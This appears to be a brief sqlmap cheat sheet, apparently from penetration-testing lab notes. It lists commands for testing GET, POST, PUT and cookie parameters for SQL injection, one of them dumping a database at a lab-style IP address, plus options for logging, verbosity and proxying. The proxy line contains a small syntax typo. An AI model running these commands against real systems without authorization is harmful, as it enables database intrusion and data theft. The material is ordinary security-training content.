
# Basic Usage

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

## HTTP Request Type

```bash
# GET Request  
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch  
  
# POST Request  
sqlmap "http://www.example.com/" --data "uid=1&name=test"  
  
# POST Injection Point  
sqlmap "http://www.example.com/" --data "uid=1*&name=test"  
  
# PUT Request  
sqlmap -u "http://www.target.com/vuln.php?id=1" --data="id=1" --method PUT
```

## Testing Cookie

```bash
sqlmap -u "http://154.57.164.70:32070/case3.php" --cookie="id=1" --level=2 --batch --dump
```

# Handling SQLMap Errors

```bash
# Store traffic to an output file
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

# Specify verbosity level
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch

# Display Errors
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch --parse-errors

# Using Proxy
sqlmap -u "http://www.target.com/vuln.php?id=1" --proxy"http://127.0.0.1:8080"
```